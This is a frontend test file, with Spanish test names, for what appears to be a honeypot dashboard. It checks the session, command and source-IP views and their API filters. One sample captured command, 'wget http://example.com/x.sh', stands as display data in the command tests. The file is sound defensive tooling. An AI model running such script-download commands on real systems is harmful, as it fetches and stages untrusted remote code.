import { fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import type { ReactNode } from "react";
import { MemoryRouter, Route, Routes, useLocation } from "react-router-dom";
import { describe, expect, it } from "vitest";

import { CommandsPage } from "../pages/CommandsPage";
import {
  makeCommandPage,
  makeSessionPage,
  makeSourceDetail,
  makeSourcePage,
  mockBackend,
  paths,
} from "./fixtures";
import { SessionsPage } from "../pages/SessionsPage";
import { SourceDetailPage } from "../pages/SourceDetailPage";
import { SourcesPage } from "../pages/SourcesPage";

function LocationProbe() {
  const location = useLocation();
  return <span data-testid="location">{`${location.pathname}${location.search}`}</span>;
}

function renderAt(page: ReactNode, entry: string) {
  return render(
    <MemoryRouter initialEntries={[entry]}>
      <LocationProbe />
      {page}
    </MemoryRouter>,
  );
}

/** The detail page reads the address from the route, so it needs a real one. */
function renderSourceDetail() {
  return render(
    <MemoryRouter initialEntries={["/sources/203.0.113.10"]}>
      <Routes>
        <Route path="/sources/:sourceIp" element={<SourceDetailPage />} />
      </Routes>
    </MemoryRouter>,
  );
}

async function lastRequest(calls: { url: string }[], path: string): Promise<URL> {
  await waitFor(() => expect(paths(calls).some((url) => url.includes(path))).toBe(true));
  const matching = paths(calls).filter((url) => url.includes(path));
  return new URL(matching[matching.length - 1] as string, "http://dashboard.test");
}

describe("RF-08 consulta de sesiones", () => {
  it("muestra cada sesión con su dirección, duración y resultado de autenticación", async () => {
    mockBackend((url) =>
      url.pathname === "/api/v1/sessions" ? { body: makeSessionPage() } : undefined,
    );

    renderAt(<SessionsPage />, "/sessions");

    expect(await screen.findByText("sess-1")).toBeDefined();
    // The duration is rendered in the largest whole unit, not raw milliseconds.
    expect(screen.getByText("1 min 0 s")).toBeDefined();
    expect(screen.getByText("500 ms")).toBeDefined();
    expect(screen.getByText("con éxito")).toBeDefined();
    expect(screen.getByText("fallida")).toBeDefined();
    expect(screen.getByText(/2 en total/)).toBeDefined();
  });

  it("enlaza los comandos de una sesión con la consulta ya filtrada por ella", async () => {
    mockBackend((url) =>
      url.pathname === "/api/v1/sessions" ? { body: makeSessionPage() } : undefined,
    );

    renderAt(<SessionsPage />, "/sessions");

    // RF-08 lists the commands of each session, so the count is a link.
    const commandsLink = await screen.findByRole("link", { name: "1" });
    expect(commandsLink.getAttribute("href")).toBe("/commands?session_id=sess-2");
  });

  it("enlaza la sesión con sus eventos y la dirección con su detalle", async () => {
    mockBackend((url) =>
      url.pathname === "/api/v1/sessions" ? { body: makeSessionPage() } : undefined,
    );

    renderAt(<SessionsPage />, "/sessions");

    const sessionLink = await screen.findByRole("link", { name: "sess-1" });
    expect(sessionLink.getAttribute("href")).toBe("/events?session_id=sess-1");

    const ipLink = screen.getByRole("link", { name: "203.0.113.10" });
    expect(ipLink.getAttribute("href")).toBe("/sources/203.0.113.10");
  });

  it("manda al backend los filtros de dirección y usuario", async () => {
    const calls = mockBackend((url) =>
      url.pathname === "/api/v1/sessions" ? { body: makeSessionPage() } : undefined,
    );

    renderAt(<SessionsPage />, "/sessions?source_ip=203.0.113.10&username=root");

    const request = await lastRequest(calls, "/api/v1/sessions?");
    expect(request.searchParams.get("source_ip")).toBe("203.0.113.10");
    expect(request.searchParams.get("username")).toBe("root");
  });

  it("avisa cuando ninguna sesión coincide con los filtros", async () => {
    mockBackend((url) =>
      url.pathname === "/api/v1/sessions" ? { body: makeSessionPage({ items: [] }) } : undefined,
    );

    renderAt(<SessionsPage />, "/sessions?source_ip=198.51.100.4");

    expect(await screen.findByText(/Ninguna sesión coincide/)).toBeDefined();
  });
});

describe("RF-09 consulta de comandos", () => {
  it("muestra el comando, la línea completa y su resultado", async () => {
    mockBackend((url) =>
      url.pathname === "/api/v1/commands" ? { body: makeCommandPage() } : undefined,
    );

    renderAt(<CommandsPage />, "/commands");

    const line = await screen.findByText("wget http://example.com/x.sh");
    const table = line.closest("table") as HTMLTableElement;
    // The parsed command and the full line are separate columns.
    expect(within(table).getByText("wget")).toBeDefined();
    expect(within(table).getByText("totally-not-a-command --now")).toBeDefined();
    // Only the failed command carries an outcome badge.
    expect(within(table).getByText("fallida")).toBeDefined();
    expect(within(table).queryByText("exitosa")).toBeNull();
  });

  it("enlaza la línea completa con el evento que la originó", async () => {
    mockBackend((url) =>
      url.pathname === "/api/v1/commands" ? { body: makeCommandPage() } : undefined,
    );

    renderAt(<CommandsPage />, "/commands");

    const link = await screen.findByRole("link", { name: "wget http://example.com/x.sh" });
    expect(link.getAttribute("href")).toBe("/events/e-1");
  });

  it("traduce la búsqueda de texto libre al parámetro que acepta la API", async () => {
    const calls = mockBackend((url) =>
      url.pathname === "/api/v1/commands" ? { body: makeCommandPage() } : undefined,
    );

    renderAt(<CommandsPage />, "/commands?q=wget&session_id=sess-1");

    const request = await lastRequest(calls, "/api/v1/commands?");
    expect(request.searchParams.get("q")).toBe("wget");
    expect(request.searchParams.get("session_id")).toBe("sess-1");
  });

  it("muestra la sesión como filtro visible y permite quitarla", async () => {
    const calls = mockBackend((url) =>
      url.pathname === "/api/v1/commands" ? { body: makeCommandPage() } : undefined,
    );

    renderAt(<CommandsPage />, "/commands?session_id=sess-1");

    // A hidden filter would be a confusing one, so the session is a chip.
    expect(await screen.findByText("Sesión")).toBeDefined();
    await screen.findByRole("table");

    fireEvent.click(screen.getByRole("button", { name: "Quitar" }));

    await waitFor(() =>
      expect(screen.getByTestId("location").textContent).not.toContain("session_id"),
    );
    const last = paths(calls).filter((url) => url.includes("/api/v1/commands?")).at(-1) as string;
    expect(new URL(last, "http://dashboard.test").searchParams.get("session_id")).toBeNull();
  });
});

describe("RF-10 consulta por IP de origen", () => {
  it("muestra los contadores de cada dirección y el total de direcciones", async () => {
    mockBackend((url) =>
      url.pathname === "/api/v1/sources" ? { body: makeSourcePage() } : undefined,
    );

    renderAt(<SourcesPage />, "/sources");

    expect(await screen.findByRole("link", { name: "203.0.113.10" })).toBeDefined();
    expect(screen.getByRole("link", { name: "198.51.100.4" })).toBeDefined();
    expect(screen.getByText(/2 direcciones/)).toBeDefined();
    // The page totals only add up what the current page holds.
    expect(screen.getByText(/80 intentos de autenticación/)).toBeDefined();
    expect(screen.getByText(/1 fallos\./)).toBeDefined();
  });

  it("no ofrece un filtro de dirección, porque la lista ya está agrupada por ella", async () => {
    const calls = mockBackend((url) =>
      url.pathname === "/api/v1/sources" ? { body: makeSourcePage() } : undefined,
    );

    renderAt(<SourcesPage />, "/sources?source_ip=203.0.113.10");

    await screen.findByRole("table");
    const last = await lastRequest(calls, "/api/v1/sources?");
    expect(last.searchParams.get("source_ip")).toBeNull();
  });

  it("muestra el detalle de una dirección con su desglose por categoría", async () => {
    mockBackend((url) =>
      url.pathname === "/api/v1/sources/203.0.113.10" ? { body: makeSourceDetail() } : undefined,
    );

    renderSourceDetail();

    expect(await screen.findByRole("heading", { name: "203.0.113.10" })).toBeDefined();
    expect(screen.getByText("Eventos por categoría")).toBeDefined();
    expect(screen.getByText("Autenticaciones")).toBeDefined();
    expect(screen.getByText("Eventos")).toBeDefined();
    expect(screen.getByRole("link", { name: "root" })).toBeDefined();
  });

  it("reporta el error del backend y ofrece reintentar", async () => {
    mockBackend((url) =>
      url.pathname === "/api/v1/sources/203.0.113.10"
        ? { status: 404, body: { detail: "no events were recorded for 203.0.113.10" } }
        : undefined,
    );

    renderSourceDetail();

    expect(await screen.findByText(/no events were recorded/)).toBeDefined();
  });
});
